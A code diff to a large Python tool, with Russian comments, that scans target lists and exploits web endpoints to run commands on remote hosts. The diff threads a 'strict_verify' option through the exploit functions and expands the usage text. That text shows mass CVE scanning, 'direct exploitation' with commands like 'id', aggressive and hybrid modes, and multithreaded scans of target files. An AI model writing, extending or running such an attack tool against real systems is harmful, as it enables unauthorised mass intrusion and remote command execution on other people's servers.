@@ -2036,7 +2036,7 @@ def safe_full_audit(target_url):
     }
 
 
-def exploit_all_endpoints(target_url, command="id", aggressive=False):
+def exploit_all_endpoints(target_url, command="id", aggressive=False, strict_verify=True):
     """
     Эксплуатировать все endpoints из списка ENDPOINTS
     """
@@ -2071,7 +2071,8 @@ def exploit_all_endpoints(target_url, command="id", aggressive=False):
                     endpoint=endpoint,
                     method='GET',
                     command=command,
-                    aggressive=aggressive
+                    aggressive=aggressive,
+                    strict_verify=strict_verify
                 )
             else:
                 # Для остальных пробуем POST
@@ -2080,7 +2081,8 @@ def exploit_all_endpoints(target_url, command="id", aggressive=False):
                     endpoint=endpoint,
                     method='POST',
                     command=command,
-                    aggressive=aggressive
+                    aggressive=aggressive,
+                    strict_verify=strict_verify
                 )
             
             if result:
@@ -2884,16 +2886,24 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  %(prog)s scan targets.txt results        # Scan targets and save reports
-  %(prog)s exploit report.json            # Load and exploit from report
-  %(prog)s menu                           # Start interactive menu
-  %(prog)s direct http://target.com       # Direct exploitation (tests ALL endpoints)
-  %(prog)s direct http://target.com -e /api/graphql  # Specific endpoint
-  %(prog)s direct http://target.com -a -c "id"       # Aggressive mode with command
-  %(prog)s direct http://target.com --test-all       # Test all endpoints without prompt
-  %(prog)s direct http://target.com --cve-scan       # CVE-specific scan only
-  %(prog)s safe-audit http://target.com -o safe.json  # Safe encoding audit
-  %(prog)s log-audit http://target.com -o log.json    # Safe Log2Shell/Log4Shell risk audit
+  %(prog)s scan targets.txt results                     # Scan targets and save reports
+  %(prog)s scan targets.txt results -t 50               # Scan with custom threads
+  %(prog)s exploit report.json                          # Load and exploit from report
+  %(prog)s menu                                         # Start interactive menu
+  %(prog)s direct http://target.com                     # Direct exploitation (auto endpoint detection)
+  %(prog)s direct http://target.com -e /api/graphql     # Specific endpoint
+  %(prog)s direct http://target.com -a -c "id"         # Aggressive mode with command
+  %(prog)s direct http://target.com --quick             # Test only common endpoints
+  %(prog)s direct http://target.com --test-all          # Test all endpoints without prompt
+  %(prog)s direct http://target.com --hybrid            # Hybrid exploitation technique
+  %(prog)s direct http://target.com --cve-scan          # CVE-specific scan only
+  %(prog)s direct http://target.com --no-strict-verify  # Disable strict replay verification
+  %(prog)s cve-scan targets.txt -o cve_results.txt      # Mass CVE scanning
+  %(prog)s cve-scan targets.txt -o out.txt -t 40        # Mass CVE scan with threads
+  %(prog)s safe-audit http://target.com                 # Full passive audit family
+  %(prog)s safe-audit http://target.com -o safe.json    # Save passive audit report
+  %(prog)s log-audit http://target.com                  # Safe log risk audit
+  %(prog)s log-audit http://target.com -o log.json      # Save safe log audit report
         """
     )
     
@@ -3013,12 +3023,13 @@ Examples:
                                 target_url=args.target_url,
                                 endpoint=endpoint_url,
                                 command=args.command,
-                                aggressive=args.aggressive
+                                aggressive=args.aggressive,
+                                strict_verify=(not args.no_strict_verify)
                             )
                             time.sleep(0.5)
                     elif args.test_all:
                         # Тестируем все endpoints без подтверждения
-                        exploit_all_endpoints(args.target_url, args.command, args.aggressive)
+                        exploit_all_endpoints(args.target_url, args.command, args.aggressive, strict_verify=(not args.no_strict_verify))
                     else:
                         # Автоматический поиск рабочих endpoints
                         print(f"[+] Auto-detecting working endpoints for {args.target_url}")
@@ -3049,7 +3060,7 @@ Examples:
                             choice = input("\nSelect option (1/2/3): ").strip()
                             
                             if choice == '1':
-                                exploit_all_endpoints(args.target_url, args.command, args.aggressive)
+                                exploit_all_endpoints(args.target_url, args.command, args.aggressive, strict_verify=(not args.no_strict_verify))
                             elif choice == '2':
                                 common_endpoints = [
                                     "/api/graphql",
@@ -3066,7 +3077,8 @@ Examples:
                                         target_url=args.target_url,
                                         endpoint=endpoint_url,
                                         command=args.command,
-                                        aggressive=args.aggressive
+                                        aggressive=args.aggressive,
+                                        strict_verify=(not args.no_strict_verify)
                                     )
                                     time.sleep(0.5)
                             elif choice == '3':
@@ -3081,7 +3093,8 @@ Examples:
                                         target_url=args.target_url,
                                         endpoint=endpoint_url,
                                         command=args.command,
-                                        aggressive=args.aggressive
+                                        aggressive=args.aggressive,
+                                        strict_verify=(not args.no_strict_verify)
                                     )
                             else:
                                 print("[!] Invalid choice")
